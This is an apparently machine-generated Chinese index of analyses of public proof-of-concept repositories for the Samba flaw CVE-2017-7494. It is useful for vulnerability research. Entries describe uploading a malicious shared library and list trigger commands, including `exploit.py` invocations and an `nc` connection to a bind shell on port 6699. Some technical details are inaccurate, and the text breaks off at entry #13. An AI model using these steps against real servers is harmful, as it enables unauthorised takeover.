# CVE-2017-7494

> 📦 该CVE有 **16** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2017-7494-00mjk_exploit-CVE-2017-7494.md](../2017/CVE-2017-7494-00mjk_exploit-CVE-2017-7494.md)

## CVE-2017-7494 SambaCry 远程代码执行漏洞

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 3.5.0 <= version < 4.6.4, 4.5.x < 4.5.10, 4.4.x < 4.4.14

**利用条件:** 需要目标服务器存在可写共享目录，并且攻击者能够进行身份验证以访问该共享。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-7494（SambaCry）是一个存在于Samba中的远程代码执行漏洞。攻击者可以通过上传恶意共享库到可写共享目录，然后通过特制的命名管道触发服务器加载和执行该恶意库，从而实现远程代码执行。

**有效性：**

提供的PoC代码看起来是有效的。漏洞库信息和漏洞利用代码中的描述一致，表明这是一个已知的且可利用的漏洞。PoC代码中包含了利用步骤，包括上传恶意共享库和触发执行的过程。代码中给出了明确的利用示例，这表明该漏洞已经得到了充分的研究。

**投毒风险：**

PoC代码中包含一个C文件 (`bindshell-samba.c`)，该文件编译成共享库后会被上传到目标服务器，并在目标服务器上执行反弹shell。主要风险在于，该C文件中的反弹shell端口 (`6699`) 是硬编码的。如果攻击者修改了端口，或者植入了其他恶意代码，则可能存在投毒风险。虽然提供的代码本身看起来实现了描述中的功能，但总是存在被修改和用于恶意目的的可能性。因此，投毒风险估计为10%。

**利用方式：**

1.  **身份验证：** 攻击者需要能够通过某种方式对目标Samba服务器进行身份验证，以访问可写共享目录。
2.  **恶意共享库上传：** 攻击者将包含恶意代码的共享库（`libbindshell-samba.so`）上传到可写共享目录。
3.  **触发执行：** 攻击者利用命名管道的漏洞，构造特殊的请求，强制Samba服务器加载并执行上传的恶意共享库。
4.  **远程代码执行：** 恶意共享库在Samba服务器的上下文中执行，从而允许攻击者执行任意代码。通常，恶意库会创建一个反弹shell，允许攻击者远程控制受感染的服务器。

**项目地址:** [00mjk/exploit-CVE-2017-7494](https://github.com/00mjk/exploit-CVE-2017-7494)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #2

**来源**: [CVE-2017-7494-0xm4ud_noSAMBAnoCRY-CVE-2017-7494.md](../2017/CVE-2017-7494-0xm4ud_noSAMBAnoCRY-CVE-2017-7494.md)

## CVE-2017-7494 - Samba远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，允许恶意客户端执行任意代码

**影响版本:** 3.5.0 <= version < 4.6.4, 4.5.10, 4.4.14

**利用条件:** 需要可写共享目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2017-7494 漏洞允许攻击者通过上传共享库到可写共享目录，然后诱使服务器加载并执行它，从而实现远程代码执行。

**有效性：** 漏洞库信息和多个来源表明此漏洞存在可利用性。

**投毒风险：** 提供的“漏洞利用代码”实际上只是 GNU GPL v3 许可协议文本，不是漏洞利用代码，不能直接判定是否存在恶意代码。实际的exp一般包含一个payload共享库，攻击者需要编译恶意的动态链接库(.so)上传到目标服务器上。

**利用方式：**
1.  找到具有可写权限的Samba共享目录。
2.  创建一个包含恶意代码的共享库（.so 文件）。
3.  将该共享库上传到目标Samba服务器的可写共享目录。
4.  构造一个恶意的请求，使Samba服务器加载并执行上传的共享库。

**总结:**
该漏洞利用方式是通过利用Samba服务器加载共享库的机制，上传恶意的共享库到可写目录，从而实现远程代码执行。由于缺少实际的漏洞利用代码，无法进行更详细的分析。提供的license文件本身不具备任何利用价值，没有投毒风险。


**项目地址:** [0xm4ud/noSAMBAnoCRY-CVE-2017-7494](https://github.com/0xm4ud/noSAMBAnoCRY-CVE-2017-7494)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #3

**来源**: [CVE-2017-7494-FelipeR-UFBA_cve-2017-7494-fixed.md](../2017/CVE-2017-7494-FelipeR-UFBA_cve-2017-7494-fixed.md)

## CVE-2017-7494-Samba-远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** since 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14

**利用条件:** 需要Samba服务器开启可写共享，并且客户端能够访问该共享。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-7494，也被称为“SambaCry”，是一个存在于Samba服务器中的远程代码执行漏洞。该漏洞允许恶意客户端上传共享库到可写的共享目录，并诱使服务器加载并执行它。攻击者可以通过构造特定的请求，利用Samba服务器的漏洞，执行任意代码，从而完全控制受影响的服务器。提供的Dockerfile和相关配置文件构建了一个易受攻击的Samba服务器环境，方便漏洞的复现和测试。

**有效性：**

从漏洞库信息和提供的POC代码来看，该漏洞的利用是可行的。漏洞描述明确指出攻击者可以上传恶意共享库并执行，POC代码创建了一个具有可写权限的共享目录，并配置了Samba服务器允许guest访问，使得攻击者可以方便地上传和触发恶意代码执行。

**利用方式：**

1.  配置易受攻击的Samba服务器：使用提供的Dockerfile构建Samba服务器镜像。
2.  访问可写共享：使用Samba客户端（例如`smbclient`）连接到服务器的可写共享（例如`vuln`）。
3.  上传恶意共享库：将包含恶意代码的共享库（`.so`文件）上传到可写共享目录。
4.  触发漏洞：构造一个特殊的Samba请求，迫使服务器加载并执行上传的共享库。

**投毒风险：**

代码库中存在潜在的投毒风险，但风险较低。

*   Dockerfile中的`apt-get install -y`命令可能安装额外的恶意软件包，但是没有发现可疑软件。
*   `entrypoint.sh`脚本启动Samba服务并进入bash shell，这本身不是恶意行为，但如果攻击者获取了容器的控制权，他们就可以在容器内部执行任意命令。
*   `smb.conf`配置文件中的`guest ok = yes`和`public = yes`允许未经身份验证的访问，这是漏洞利用的必要条件，但同时会增加攻击面，如果攻击者能篡改这个配置文件，可能会添加后门账户。

总体来说，投毒的风险较低，约为10%。主要的风险在于攻击者控制了容器后的潜在恶意行为，以及配置文件的潜在篡改。


**项目地址:** [FelipeR-UFBA/cve-2017-7494-fixed](https://github.com/FelipeR-UFBA/cve-2017-7494-fixed)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #4

**来源**: [CVE-2017-7494-Hansindu-M_CVE-2017-7494_IT19115344.md](../2017/CVE-2017-7494-Hansindu-M_CVE-2017-7494_IT19115344.md)

## CVE-2017-7494 - Samba 远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Samba

**危害等级:** 高危，允许恶意客户端以 root 权限执行任意代码

**影响版本:** 3.5.0 <= version < 4.6.4, 4.5.10, 4.4.14

**利用条件:** 需要拥有对 Samba 共享目录的写权限

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2017-7494 存在于 Samba 3.5.0 到 4.6.4 版本（不包括 4.6.4），以及 4.5.10 和 4.4.14 版本。该漏洞允许经过身份验证的恶意客户端，如果拥有对 Samba 共享目录的写权限，则可以上传恶意共享库，并导致服务器加载并执行该库，从而以 root 权限执行任意代码。

**利用方式：**

1.  **权限获取：** 攻击者首先需要获得对 Samba 共享目录的写权限。这可以通过爆破弱口令、利用其他漏洞或者通过社会工程学等方式实现。
2.  **恶意库上传：** 一旦拥有写权限，攻击者会将包含恶意代码的共享库（例如 `.so` 文件）上传到共享目录。
3.  **触发执行：** 攻击者通过修改共享目录配置，或者通过其他手段（如指定恶意库路径）来触发 Samba 服务器加载并执行上传的恶意库。
4.  **代码执行：** 当 Samba 服务器加载恶意库时，其中的代码会以 root 权限执行，从而允许攻击者完全控制服务器。

**有效性：**

漏洞库信息和exploit-db的公开exp确认漏洞的有效性

**投毒风险：**

提供的POC代码仓库中只包含一个README文件和一个link，指向一个演示视频。视频链接本身存在风险，但分析已给出的信息后，无法确定视频内容。代码仓库本身不存在恶意代码，因此投毒风险为 0%。需要注意的是，实际利用中上传的恶意共享库才是真正的攻击载荷，需要进行严格的安全检查。

**项目地址:** [Hansindu-M/CVE-2017-7494_IT19115344](https://github.com/Hansindu-M/CVE-2017-7494_IT19115344)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #5

**来源**: [CVE-2017-7494-I-Rinka_BIT-EternalBlue-for-macOS_Linux.md](../2017/CVE-2017-7494-I-Rinka_BIT-EternalBlue-for-macOS_Linux.md)

## CVE-2017-7494 Samba 远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，允许恶意客户端上传共享库并执行

**影响版本:** 3.5.0 <= version < 4.6.4, 4.5.10, 4.4.14

**利用条件:** 可写共享目录

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-7494是Samba的一个远程代码执行漏洞，允许恶意客户端上传一个共享库到可写的共享目录，然后让服务器加载并执行它。

**漏洞利用方式：**

1.  **找到可写共享目录：** 攻击者首先需要找到目标Samba服务器上一个可写的共享目录。如果没有配置不当或者权限控制不严，攻击就无法进行。
2.  **上传恶意共享库：** 攻击者编译一个包含恶意代码的共享库（.so文件），并将其上传到可写共享目录中。`Makefile` 提供了一个编译 `payload.so` 的方法。
3.  **触发加载执行：**  攻击者通过精心构造的SMB请求，诱使Samba服务器加载并执行上传的恶意共享库。这通常涉及到利用`smb_probe_module` 函数，该函数存在漏洞，允许加载任意模块。`exploit.py`脚本实现了发送恶意的SMB请求的部分。
4.  **反弹shell:**  `payload.c`的内容没有提供，但是从`exploit.py`的用法中可以看出，payload会被配置为反弹shell到攻击者的机器。`exploit.py` 使用 `-lhost` 参数指定反弹shell的地址。

**有效性：**

提供的POC代码看起来是有效的。漏洞库信息表明存在公开的漏洞利用代码，并且存在可用的 Metasploit 模块和其他漏洞利用程序。POC代码包含生成恶意共享库的Makefile和一个用于触发漏洞的Python脚本（`exploit.py`）。README文件也提供了使用说明。

**投毒风险：**

存在一定的投毒风险，约为10%。
*   **依赖安装脚本：** `install_requirement.sh` 脚本自动安装依赖，如果脚本中的源被篡改，可能引入恶意依赖。
*   **修改的impacket包：** POC代码要求使用修改过的`impacket`包。虽然作者解释说这是为了构造有效的请求，但修改过的包始终存在潜在风险。如果修改引入了后门，可能导致更严重的后果。 但从代码分析来看，修改是为了兼容性，风险较低。
*   **Payload不确定性：** `payload.c` 没有提供，攻击者需要自行编写payload。 如果payload源不安全，存在被植入恶意代码的风险，但这个属于使用者自身的问题，而非项目本身的投毒。

总的来说，虽然POC代码看起来可以工作，但用户应该仔细审查`install_requirement.sh`脚本和修改过的`impacket`包，确保没有恶意代码。并且需要自己编译payload.c， 需要确保编译的源安全。


**项目地址:** [I-Rinka/BIT-EternalBlue-for-macOS_Linux](https://github.com/I-Rinka/BIT-EternalBlue-for-macOS_Linux)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #6

**来源**: [CVE-2017-7494-Waffles-2_SambaCry.md](../2017/CVE-2017-7494-Waffles-2_SambaCry.md)

## CVE-2017-7494 Samba 远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Samba

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** since 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14

**利用条件:** 需要Samba服务器开启可写共享，并且允许客户端上传文件

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2017-7494 漏洞允许恶意客户端通过上传包含恶意代码的共享库到可写共享，然后通过精心构造的SMB请求触发服务器加载并执行该恶意代码，从而实现远程代码执行。漏洞利用方式主要分为以下几个步骤：

1.  **发现目标：** 扫描网络，识别运行存在漏洞的Samba版本的服务器，重点关注开启了可写共享的服务器。
2.  **上传恶意共享库：** 攻击者将包含恶意代码的共享库（例如`.so`文件）上传到目标服务器的可写共享目录中。
3.  **构造恶意的SMB请求：** 攻击者向Samba服务器发送一个特制的SMB请求，该请求指定加载上传的恶意共享库。
4.  **触发代码执行：** Samba服务器在处理恶意SMB请求时，会加载并执行上传的共享库中的代码，从而导致远程代码执行。

**有效性评估：** 根据漏洞库信息和Exploit-DB中的expolit，该漏洞的POC代码应该是有效的，因为漏洞的描述清晰地说明了利用方式，并且存在公开的expolit。

**投毒风险评估：** 提供的代码片段 `CVE-2017-7494.nse` 是一个Nmap NSE脚本，用于检测目标Samba服务器是否运行着受CVE-2017-7494影响的版本。该脚本通过检查Samba的版本信息来判断是否存在潜在的漏洞。此脚本主要功能是做版本检测，不会进行漏洞利用。因此，投毒风险较低，但也不能完全排除作者在输出信息中加入恶意链接或其他隐蔽行为的可能性。给出的投毒风险评分为1%。

**项目地址:** [Waffles-2/SambaCry](https://github.com/Waffles-2/SambaCry)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #7

**来源**: [CVE-2017-7494-Zer0d0y_Samba-CVE-2017-7494.md](../2017/CVE-2017-7494-Zer0d0y_Samba-CVE-2017-7494.md)

## CVE-2017-7494 Samba 远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 3.5.0 <= Samba < 4.6.4, 4.5.10, 4.4.14

**利用条件:** 可写共享目录，匿名或有效用户身份连接到Samba服务器

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2017-7494，也被称为“SambaCry”，是一个存在于Samba中的远程代码执行漏洞。攻击者可以利用此漏洞，通过上传恶意共享库到可写共享目录，然后诱使服务器加载并执行它，从而实现远程代码执行。漏洞存在于 Samba 3.5.0 及以上版本，直到修复版本。提供的漏洞利用代码（README.md文件）指向一个漏洞分析文章，本身不包含实际的利用代码，但是提供了漏洞研究的参考信息，说明漏洞的存在和利用方法。根据漏洞库信息，漏洞利用需要一个可写的共享目录。由于POC只是一个`README.md`文件，并没有包含可执行的代码，因此不存在投毒风险。利用方式总结如下：

1.  **找到可写共享目录：** 攻击者首先需要找到Samba服务器上允许写入的共享目录。
2.  **上传恶意共享库：** 将包含恶意代码的共享库（例如，`.so`文件）上传到该共享目录。
3.  **触发加载执行：**  通过Samba客户端连接到共享目录，并构造特殊的路径，迫使Samba服务器加载并执行上传的共享库。可以通过`msfconsole`等工具生成恶意payload，并上传到可写共享目录后，通过构造包含payload路径的请求来触发漏洞。

总而言之，该漏洞的利用依赖于能够写入共享目录和构造特定的请求路径。根据CISA KEV目录，该漏洞已被积极利用。

**项目地址:** [Zer0d0y/Samba-CVE-2017-7494](https://github.com/Zer0d0y/Samba-CVE-2017-7494)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #8

**来源**: [CVE-2017-7494-adjaliya_-CVE-2017-7494-Samba-Exploit-POC.md](../2017/CVE-2017-7494-adjaliya_-CVE-2017-7494-Samba-Exploit-POC.md)

## CVE-2017-7494-Samba-远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，允许恶意客户端上传共享库并导致服务器加载和执行，从而实现远程代码执行

**影响版本:** 3.5.0 <= version < 4.6.4, 4.5.0 <= version < 4.5.10, 4.4.0 <= version < 4.4.14

**利用条件:** 需要目标Samba服务器存在可写共享目录，且客户端能够访问该共享目录。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-7494 (SambaCry) 漏洞允许经过身份验证的攻击者通过上传恶意共享库到可写共享目录，然后触发服务器加载并执行该库，从而实现远程代码执行。利用方式包括：

1.  **上传恶意共享库：** 攻击者首先需要找到一个具有写入权限的共享目录。
2.  **触发加载：**  攻击者通过修改共享目录的配置或者其他方式，使得Samba服务器加载上传的恶意共享库。
3.  **远程代码执行：** 一旦恶意共享库被加载，其中的代码将在Samba服务器的上下文中执行，攻击者可以借此执行任意命令。

**关于有效性：**
漏洞库信息和描述中已经明确指出漏洞的存在和影响范围。漏洞利用代码（尽管只有README.md文件）也描述了漏洞的影响和受影响的版本。综合来看，此漏洞真实有效。

**关于投毒风险：**
当前提供的文件内容（README.md）主要描述漏洞信息，并未包含可执行的漏洞利用代码。因此，投毒风险较低，但不能完全排除。在实际使用漏洞利用代码时，务必进行代码审计，以避免引入恶意代码。由于缺少实际的可执行漏洞利用代码，判断存在投毒代码的概率为10%。

**漏洞利用方式总结：**
攻击者利用此漏洞需要具备以下条件：

*   能够访问目标Samba服务器上的共享目录。
*   在共享目录上拥有写入权限。

利用步骤如下：

1.  **找到可写共享：** 确定目标Samba服务器上是否存在可写的共享目录。
2.  **上传恶意so文件：** 将包含恶意代码的共享库文件（例如：.so文件）上传到可写共享目录中。
3.  **触发加载恶意代码：** 通过特定的Samba命令或配置，触发服务器加载上传的恶意共享库，从而执行其中的恶意代码。

**项目地址:** [adjaliya/-CVE-2017-7494-Samba-Exploit-POC](https://github.com/adjaliya/-CVE-2017-7494-Samba-Exploit-POC)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #9

**来源**: [CVE-2017-7494-betab0t_cve-2017-7494.md](../2017/CVE-2017-7494-betab0t_cve-2017-7494.md)

## CVE-2017-7494 Samba 远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，可能导致远程代码执行和完全控制服务器

**影响版本:** 3.5.0 <= Samba < 4.6.4, 4.5.10, 4.4.14

**利用条件:** 需要对Samba共享目录具有写入权限

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Samba服务器中，允许恶意客户端上传共享库到可写共享目录，然后使服务器加载并执行它。

**有效性评估：**

根据漏洞信息和提供的POC代码，该POC的有效性较高。漏洞库信息明确指出该漏洞允许远程代码执行，并且有可用的Exploit-DB链接（42084和42060）。提供的POC代码包含了利用此漏洞的脚本 (exploit.py)，以及构建恶意共享库 (libpoc.so) 的方法。该脚本尝试通过NetBIOS over TCP协议 (ncacn_np) 连接到目标服务器的指定管道，从而触发恶意代码的执行。

**投毒风险评估：**

分析提供的POC代码，各个组件的功能如下：

*   `README.md`:  提供了漏洞利用的说明，包括Samba版本要求、Impacket依赖以及使用方法。
*   `exploit.py`:  利用脚本，用于连接到目标Samba服务器并触发漏洞。
*   `requirements.txt`:  定义了所需的Python依赖，即Impacket的特定版本。
*   `payload/build.sh`:  用于编译恶意共享库 `libpoc.so`。
*   `payload/poc.c`:  恶意共享库的源代码，其中包含`samba_init_module`函数，该函数在加载时会被执行。
*   `payload/poc.h`:  恶意共享库的头文件。

仔细检查上述文件后，没有发现任何明显的恶意或隐藏代码，旨在进行非预期的操作。`poc.c` 中的代码只是打印一条消息，用于验证漏洞是否成功利用。因此，可以认为该仓库中存在作者隐藏的投毒代码的风险较低。

**利用方式：**

1.  **环境准备：**搭建存在漏洞的Samba服务器（3.5.0 <= 版本 < 4.6.4, 4.5.10, 4.4.14）并配置可写的共享目录。
2.  **编译恶意共享库：**使用`payload/build.sh`脚本编译`payload/poc.c`，生成`libpoc.so`。
3.  **上传恶意共享库：**将`libpoc.so`上传到目标Samba服务器的可写共享目录。
4.  **执行漏洞利用：**运行`exploit.py`脚本，指定目标IP地址和上传的共享库路径，例如：`exploit.py -t <target_ip> -m /path/to/libpoc.so`。
5.  **触发漏洞：**`exploit.py` 将尝试建立一个指向恶意库路径的RPC连接，这将导致Samba服务器加载并执行该共享库，从而实现远程代码执行。

由于没有可信的搜索引擎结果，本次分析重点依赖漏洞库信息和提供的POC代码。

**项目地址:** [betab0t/cve-2017-7494](https://github.com/betab0t/cve-2017-7494)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #10

**来源**: [CVE-2017-7494-brianwrf_SambaHunter.md](../2017/CVE-2017-7494-brianwrf_SambaHunter.md)

## CVE-2017-7494-Samba-远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 3.5.0 - 4.6.4, 4.5.10, 4.4.14

**利用条件:** 需要目标Samba服务器存在可写共享目录，攻击者能够访问该共享。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-7494，又名“SambaCry”，是一个存在于Samba服务器中的远程代码执行漏洞。从提供的漏洞库信息来看，该漏洞存在于Samba 3.5.0到4.6.4、4.5.10和4.4.14版本中。恶意客户端可以通过上传共享库到可写的共享目录，然后诱使服务器加载并执行该库来利用此漏洞。

**有效性：**
提供的POC代码（sambahunter.py）尝试利用该漏洞。它首先生成一个包含命令执行的共享库（.so文件），然后尝试将其上传到目标服务器上的已知共享目录。如果成功上传，则尝试触发服务器加载并执行该共享库。根据代码和漏洞描述，该POC具有较高的有效性。

**投毒风险：**
虽然该POC的主要功能是利用漏洞，但仍然存在一定的投毒风险。风险点在于`sambahunter.py`脚本中包含生成payload的函数。虽然代码已经贴出，但用户在使用时可能不会仔细审查代码。以下是一些潜在的投毒方式：

1.  **Payload修改：** 作者可能会在payload生成函数中植入恶意代码，例如，在执行用户指定命令之前或之后，执行一些额外的恶意操作，如安装后门、收集信息等。用户如果不检查生成的.so文件，可能会受到影响。
2.  **默认参数修改：** 如果脚本包含默认的目标服务器或命令，恶意作者可以将其设置为攻击者控制的服务器或执行恶意操作的命令。
3.  **依赖项修改：** 作者可以指定恶意版本的依赖项（例如`pysmbclient`），其中包含恶意代码。
4. **文件上传目录:** 代码中预设了一些常见的可写目录,攻击者可以在这些目录中提前放置恶意文件,等待其他用户执行。
从代码分析来看，投毒的概率较低，假设为10%。多数代码逻辑围绕漏洞利用展开，较为直接。

**利用方式：**
1.  **查找可写共享：** 攻击者首先需要确定目标Samba服务器上是否存在可写的共享目录。`sambahunter.py` 脚本会尝试常见共享目录，并上传临时文件以验证是否可写。
2.  **生成Payload：** 攻击者使用`generate_payload` 函数生成包含恶意命令的共享库（.so）文件。命令可以通过`-c`参数指定。
3.  **上传Payload：** 攻击者使用SMB协议将生成的共享库上传到可写的共享目录。
4.  **触发执行：** 攻击者通过构造一个特殊的请求，诱使Samba服务器加载并执行上传的共享库。这个请求的本质是利用Samba的`vfs_fruit`模块的路径处理缺陷，使得Samba将上传的`.so`文件当做模块加载并执行。

总的来说，该漏洞利用方式较为直接，依赖于Samba服务器配置不当（存在可写共享）和版本过旧。`sambahunter.py` 脚本简化了漏洞利用过程。

**项目地址:** [brianwrf/SambaHunter](https://github.com/brianwrf/SambaHunter)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #11

**来源**: [CVE-2017-7494-cved-sources_cve-2017-7494.md](../2017/CVE-2017-7494-cved-sources_cve-2017-7494.md)

## CVE-2017-7494-Samba-远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，允许恶意客户端上传共享库到可写共享，然后导致服务器加载并执行它。

**影响版本:** since 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14

**利用条件:** 需要对Samba服务器的写入权限的共享目录进行访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-7494，也被称为"SambaCry"，是一个存在于Samba 3.5.0及之后版本中的远程代码执行漏洞。攻击者可以利用此漏洞通过上传恶意共享库到可写共享，然后触发服务器加载并执行该库，从而获得服务器的控制权。

**有效性分析：**

根据漏洞描述和漏洞库信息，该漏洞允许远程代码执行。提供的Dockerfile旨在构建一个包含漏洞版本的Samba服务器的Docker镜像，用于漏洞测试。提供的`smb.conf`配置文件定义了一个可写共享目录`/data`，guest用户可访问。构建过程还创建了一个名为`cved`的用户，并设置了相应的Samba密码。因此，提供的POC代码框架是有效的，允许在Docker容器中搭建存在漏洞的环境，便于漏洞复现和验证。

**投毒风险分析：**

虽然提供的Dockerfile和相关配置文件主要用于搭建漏洞环境，但仍然存在潜在的投毒风险，虽然很低，但仍然需要注意。

*   **构建脚本中的潜在恶意代码：** 虽然Dockerfile中的大部分命令是标准的软件安装和配置命令，但仍然需要仔细检查每个命令，以防止其中存在隐藏的恶意代码。例如，`configure`和`make`命令执行的编译过程可能被篡改以植入后门。
*   **配置文件中的后门：**  `smb.conf` 文件设置`guest ok = yes`，允许匿名访问`/data` 目录，如果上传的so文件被设置为启动时加载，那么匿名用户也可以执行远程代码执行。这本身是漏洞利用的一部分，但也可以被认为是投毒，因为未经授权的用户可以利用该配置。

基于上述分析，认为此仓库中存在作者隐藏的投毒代码的可能性较低，大约为10%。主要风险在于对Samba配置不当可能导致恶意利用。

**漏洞利用方式：**

1.  **找到可写共享：** 首先，攻击者需要找到Samba服务器上的一个可写共享目录。这个可以通过nmap等扫描工具或者手动尝试访问共享目录来发现。
2.  **上传恶意共享库：** 攻击者构造一个包含恶意代码的共享库（.so文件），并将其上传到可写共享目录。
3.  **触发共享库加载：**  攻击者需要某种方式来触发Samba服务器加载并执行上传的恶意共享库。CVE-2017-7494的利用方式是利用`vfs objects = ...` 参数指定so路径，来触发Samba服务器执行恶意代码。还可以通过其他方式触发，例如修改Samba配置文件或者利用其他Samba服务。
4.  **远程代码执行：** 当Samba服务器加载恶意共享库时，其中的恶意代码将被执行，攻击者从而获得服务器的控制权。

**项目地址:** [cved-sources/cve-2017-7494](https://github.com/cved-sources/cve-2017-7494)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #12

**来源**: [CVE-2017-7494-d3fudd_CVE-2017-7494_SambaCry.md](../2017/CVE-2017-7494-d3fudd_CVE-2017-7494_SambaCry.md)

## CVE-2017-7494 SambaCry

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，允许恶意客户端上传共享库到可写共享目录，并导致服务器加载和执行它，从而实现远程代码执行。

**影响版本:** 3.5.0 <= Samba < 4.6.4, 4.5.10, 4.4.14

**利用条件:** 需要目标Samba服务器存在可写共享目录，并且攻击者能够访问该共享目录。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-7494，也被称为SambaCry，是一个存在于Samba服务中的远程代码执行漏洞。该漏洞允许攻击者通过上传一个恶意的共享库到Samba服务器的可写共享目录，然后诱使服务器加载并执行该恶意库，从而获得服务器的控制权。

**利用方式：**

1.  **查找可写共享：** 使用`smbclient -L`命令或者其他工具查找目标Samba服务器上的可写共享目录。
2.  **上传恶意共享库：** 将编译好的恶意共享库（`libbindshell-samba.so`）上传到找到的可写共享目录中。
3.  **触发漏洞：** 通过构造一个特殊的请求，诱使Samba服务器加载并执行上传的恶意共享库。这个请求可以通过`python2 exploit.py -t target_ip -m path_absoluto_server_side`命令来发送，其中`target_ip`是目标Samba服务器的IP地址，`path_absoluto_server_side`是恶意共享库在服务器上的绝对路径。
4.  **连接到反弹Shell：** 恶意共享库执行后，会在目标Samba服务器上启动一个反弹shell，攻击者可以通过`nc -vn target_ip 6699`命令连接到该反弹shell。

**关于投毒风险：**

提供的漏洞利用代码主要包含三个文件：

*   `README.md`: 包含漏洞说明和利用步骤。
*   `bindshell-samba.c`: 包含生成反弹shell的代码。这段代码本身实现了在目标机器上监听端口，并在连接时执行`/bin/sh`，创建一个反弹shell。
*   `exploit.py`: 包含触发漏洞的代码。此脚本用于发送恶意请求，促使Samba加载恶意的`.so`文件。

**潜在的投毒点分析：**

1.  `bindshell-samba.c`中，`execve("/bin/sh", NULL, NULL)`这行代码可能会被修改为执行其他恶意程序。虽然当前代码是启动一个shell，但如果被替换为执行其他恶意指令，就可能存在投毒行为。
2.  `exploit.py`脚本理论上可以修改，指向错误的模块路径，或者执行某些并非用户预期的操作，但是主要功能依然是触发漏洞。

因此，需要仔细检查`bindshell-samba.c`中的`execve`函数，确保其执行的是预期的操作。`exploit.py`脚本也需要检查，确保其没有被篡改。

综上所述，尽管提供的代码主要功能是实现漏洞利用，但仍然存在一定的投毒风险，尤其是如果`bindshell-samba.c`中的`execve`函数被修改，风险概率约为10%。

**项目地址:** [d3fudd/CVE-2017-7494_SambaCry](https://github.com/d3fudd/CVE-2017-7494_SambaCry)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #13

**来源**: [CVE-2017-7494-homjxi0e_CVE-2017-7494.md](../2017/CVE-2017-7494-homjxi0e_CVE-2017-7494.md)

## CVE-2017-7494 - Samba 远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 3.5.0 <= version < 4.6.4, 4.5.10, 4.4.14

**利用条件:** 需要有效的Samba用户凭据，可写入的共享文件夹，以及共享文件夹在服务器端的路径。某些情况下，匿名访问和常见的文件系统位置可能被利用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

